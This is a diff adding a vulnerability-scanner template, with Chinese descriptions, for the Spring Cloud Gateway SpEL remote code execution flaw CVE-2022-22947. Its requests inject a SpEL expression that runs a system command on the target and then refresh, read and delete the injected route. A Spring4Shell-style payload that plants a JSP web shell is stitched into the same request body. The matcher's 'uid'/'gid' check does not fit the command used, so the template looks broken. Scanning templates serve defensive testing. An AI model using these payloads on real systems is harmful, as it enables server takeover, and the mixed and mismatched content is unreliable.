@@ -1,0 +1,67 @@
+id: Spring-2
+
+info:
+  name: Spring Cloud Gateway SpEL RCE漏洞
+  author: attempt
+  severity: high
+  description: |
+    使用 Spring Cloud Gateway 的应用如果对外暴露了 Gateway Actuator 接口，则可能存在被 CVE-2022-22947 漏洞利用的风险。
+    攻击者可通过利用此漏洞执行 SpEL 表达式，从而在目标服务器上执行任意恶意代码，获取系统权限。
+  metadata:
+    verified: true
+    max-request: 1
+  tags: Spring,Spring Cloud Gateway,RCE
+request:
+  - raw:
+      - |
+        POST /actuator/gateway/routes/xxxxxxxxxxx HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Accept-Language: en
+        Content-Type: application/json
+
+        {
+              "id": "xxxxxxxxxxx",
+              "filters": [{
+                "name": "AddResponseHeader",
+                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"}
+                }],
+              "uri": "http://example.com",
+              "order": 0
+        }
+
+        class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29%3B%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
+      - |
+        POST /actuator/gateway/refresh HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+
+      - |
+        GET /actuator/gateway/routes/xxxxxxxxxxx HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+      - |
+        DELETE /actuator/gateway/routes/xxxxxxxxxxx HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - "uid"
+          - "gid"
+        condition: or
